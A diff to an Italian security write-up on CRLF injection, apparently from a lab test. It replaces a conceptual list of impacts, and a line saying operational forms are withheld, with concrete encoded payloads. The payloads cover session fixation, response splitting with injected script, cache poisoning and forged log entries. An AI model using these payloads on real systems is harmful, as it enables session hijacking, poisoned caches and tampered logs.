@@ -52,18 +52,30 @@ Location: /home
 X-Injected-Test: crlf-ok        <-- l'header iniettato compare: CRLF injection confermata
 ```
 
-### Fase 2 - Impatti (concettuali)
+### Fase 2 - Impatti (payload)
 
-- **Header injection**: aggiunta di `Set-Cookie` (session fixation) o header di sicurezza manipolati.
-- **HTTP response splitting**: iniezione di una doppia sequenza CRLF per chiudere gli header e introdurre un
-  corpo di risposta controllato (da cui una XSS riflessa).
-- **Cache poisoning**: se la risposta avvelenata viene memorizzata in cache, il contenuto malevolo e servito ad
-  altri utenti.
-- **Log injection**: CRLF in un valore loggato permette di inserire voci di log false o di spezzare il parsing
-  dei log (anti-forensics).
+Valore iniettato nel parametro riflesso in un header (es. il target di un redirect). `%0d%0a` = CRLF:
 
-Le forme operative complete non sono riprodotte: il principio e sempre l'iniezione di `%0d%0a` per uscire dal
-contesto previsto (un header, una riga di log).
+```
+# Header injection: imposta un cookie di sessione scelto dall'attaccante (session fixation)
+/redirect?url=%0d%0aSet-Cookie:%20SESSIONID=attacker_fixed_value
+
+# Open redirect / header spoofing
+/redirect?url=%0d%0aLocation:%20https://evil.lab
+
+# HTTP response splitting: doppio CRLF chiude gli header e inietta un corpo controllato -> XSS riflessa
+/redirect?url=%0d%0a%0d%0a<script>alert(document.cookie)</script>
+
+# Variante completa (status + header + body) per avvelenare una cache condivisa
+/x?p=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+
+# Log injection: inietta una riga di log falsa / spezza il parsing (anti-forensics)
+/login?user=admin%0d%0a2026-01-01%2000:00:00%20INFO%20login%20riuscito%20per%20admin
+```
+
+Se la risposta avvelenata finisce in una **cache** condivisa, il contenuto malevolo viene servito ad altri
+utenti (cache poisoning). Il principio e sempre l'iniezione di `%0d%0a` per uscire dal contesto previsto
+(un header, una riga di log) e iniettare struttura controllata.
 
 ## Analisi dei risultati
 
